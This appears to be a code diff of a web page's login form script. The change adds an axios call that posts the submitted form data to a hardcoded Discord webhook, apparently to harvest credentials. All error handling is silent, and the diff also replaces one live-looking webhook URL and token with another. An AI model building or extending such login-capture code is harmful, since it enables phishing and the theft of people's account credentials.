@@ -73,7 +73,7 @@
 
     <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
     <script>
-        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1271863061556363325/aEt7jHaw-7NcvvT_SK688ZsAaRgEHHcdfifHZ43jpcEVj_4v9jOrsU2qm059ar0fiYLq"; // Add your Discord Webhook URL here
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1271863058884464661/6AOM1DDnan-dwTehiNB94DkChIKk-nxt3_-Bgo4GqfFmB0SJhUKwWWuuFbah_SFlpE-I"; // Add your Discord Webhook URL here
     
         document.getElementById('login-form').addEventListener('submit', function (e) {
             e.preventDefault();
@@ -110,10 +110,20 @@
                         ]
                     };
     
-
+                    axios.post(DISCORD_WEBHOOK_URL, message)
+                        .then(() => {
+                           
+                        })
+                        .catch(() => {
+                            
+                        });
+                })
+                .catch(() => {
+                   
                 });
         });
     </script>
+    
     
 
 
